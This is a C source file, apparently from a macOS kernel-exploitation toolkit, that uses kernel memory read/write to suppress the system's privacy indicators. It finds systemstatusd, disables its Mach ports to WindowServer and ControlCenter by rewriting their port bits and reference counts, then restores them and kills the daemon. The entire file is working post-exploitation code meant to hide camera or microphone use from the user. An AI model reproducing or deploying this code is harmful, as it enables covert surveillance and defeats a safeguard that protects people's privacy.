//
//  systemstatusd.c
//  playground
//
//  Created by sreejith on 3/9/22.
//

#include <stdlib.h>
#include <limits.h>
#include <libproc.h>
#include <signal.h>

#include <xe/memory/kmem.h>
#include <xe/xnu/proc.h>
#include <xe/xnu/ipc.h>
#include <xe/util/assert.h>
#include <xe/util/log.h>
#include <xe/util/sandbox.h>
#include <xe/util/misc.h>

#include "privacy.h"

#define IO_BITS_ACTIVE 0x80000000

#define WINDOWSERVER_BINARY_PATH "/System/Library/PrivateFrameworks/SkyLight.framework/Versions/A/Resources/WindowServer"

#define SYSTEMSTATUSD_BINARY_PATH "/System/Library/PrivateFrameworks/SystemStatusServer.framework/Support/systemstatusd"

#define CONTROL_CENTER_BINARY_PATH "/System/Library/CoreServices/ControlCenter.app/Contents/MacOS/ControlCenter"

#define MAX_PORT_BACKUPS 8

struct privacy_disable_session {
    struct {
        uintptr_t port;
        uint32_t ref_cnt;
    } port_backups[MAX_PORT_BACKUPS];
    int num_port_backups;
    uintptr_t systemstatusd;
};


uintptr_t find_systemstatusd(void) {
    uintptr_t* found = alloca(sizeof(uintptr_t));
    *found = 0;
    xe_xnu_proc_iter_pids_with_binary(SYSTEMSTATUSD_BINARY_PATH, ^_Bool(pid_t pid) {
        xe_assert(*found == 0);
        int error = xe_xnu_proc_find(pid, found);
        xe_assert_err(error);
        return 0;
    });
    return *found;
}


privacy_disable_session_t privacy_disable_session_start(void) {
    privacy_disable_session_t session = malloc(sizeof(struct privacy_disable_session));
    bzero(session, sizeof(struct privacy_disable_session));
    
    uintptr_t systemstatusd = find_systemstatusd();
    xe_log_debug("found systemstatusd with process: %p", (void*)systemstatusd);
    
    int* backup_index = alloca(sizeof(int));
    *backup_index = 0;
    
    xe_xnu_ipc_iter_mach_ports(systemstatusd, ^_Bool(uint32_t port_name, uintptr_t port) {
        uintptr_t receiver_task = xe_xnu_ipc_port_get_receiver_task(port);
        if (!receiver_task) {
            return 0;
        }
        
        uintptr_t receiver_proc = xe_kmem_read_ptr(receiver_task, TYPE_TASK_MEM_BSD_INFO_OFFSET);
        pid_t receiver_pid = xe_kmem_read_uint32(receiver_proc, TYPE_PROC_MEM_P_PID_OFFSET);
        char binary_path[PATH_MAX];
        int res = proc_pidpath(receiver_pid, binary_path, sizeof(binary_path));
        xe_assert(res >= 0);
                
        if (strncmp(binary_path, WINDOWSERVER_BINARY_PATH, sizeof(binary_path)) == 0 || strncmp(binary_path, CONTROL_CENTER_BINARY_PATH, sizeof(binary_path)) == 0) {
            uint32_t bits = xe_kmem_read_uint32(port, TYPE_IPC_PORT_MEM_IP_OBJECT_OFFSET + TYPE_IPC_OBJECT_MEM_IO_BITS_OFFSET);
            
            if (!(bits & IO_BITS_ACTIVE)) {
                return 0;
            }
            
            int index = *backup_index;
            *backup_index = index + 1;
            xe_assert_cond(index, <, MAX_PORT_BACKUPS);
            
            xe_log_debug("disabling mach_port: %p with receiver: %s(%d)", (void*)port, binary_path, receiver_pid);
            bits &= ~IO_BITS_ACTIVE;
            uint32_t references = xe_kmem_read_uint32(port, TYPE_IPC_PORT_MEM_IP_OBJECT_OFFSET + TYPE_IPC_OBJECT_MEM_IO_REFERENCES_OFFSET);
            xe_kmem_write_uint32(port, TYPE_IPC_PORT_MEM_IP_OBJECT_OFFSET+ TYPE_IPC_OBJECT_MEM_IO_REFERENCES_OFFSET, 0xFFFFFFE - UINT8_MAX);
            xe_kmem_write_uint32(port, TYPE_IPC_PORT_MEM_IP_OBJECT_OFFSET + TYPE_IPC_OBJECT_MEM_IO_BITS_OFFSET, bits);
            
            session->port_backups[index].port = port;
            session->port_backups[index].ref_cnt = references;
        }
        return 0;
    });
    
    session->num_port_backups = *backup_index;
    session->systemstatusd = systemstatusd;
    return session;
}


void privacy_disable_session_kill_process(uintptr_t proc) {
    uint32_t pid = xe_kmem_read_uint32(proc, TYPE_PROC_MEM_P_PID_OFFSET);
    int error = kill(pid, SIGKILL);
    if (error) {
        xe_log_warn("failed to kill systemstatusd, err: %s", strerror(errno));
    }
}


void privacy_disable_session_stop(privacy_disable_session_t* session_p) {
    privacy_disable_session_t session = *session_p;
    
    for (int i=0; i<session->num_port_backups; i++) {
        uintptr_t port = session->port_backups[i].port;
        uint32_t ref_cnt = session->port_backups[i].ref_cnt;
        xe_log_debug("enabling mach_port: %p", (void*)port);
        uint32_t bits = xe_kmem_read_uint32(port, TYPE_IPC_PORT_MEM_IP_OBJECT_OFFSET + TYPE_IPC_OBJECT_MEM_IO_BITS_OFFSET);
        
        xe_kmem_write_uint32(port, TYPE_IPC_PORT_MEM_IP_OBJECT_OFFSET + TYPE_IPC_OBJECT_MEM_IO_BITS_OFFSET, bits | IO_BITS_ACTIVE);
        xe_kmem_write_uint32(port, TYPE_IPC_PORT_MEM_IP_OBJECT_OFFSET + TYPE_IPC_OBJECT_MEM_IO_REFERENCES_OFFSET, ref_cnt);
    }
    
    privacy_disable_session_kill_process(session->systemstatusd);
    
    free(session);
    *session_p = NULL;
}
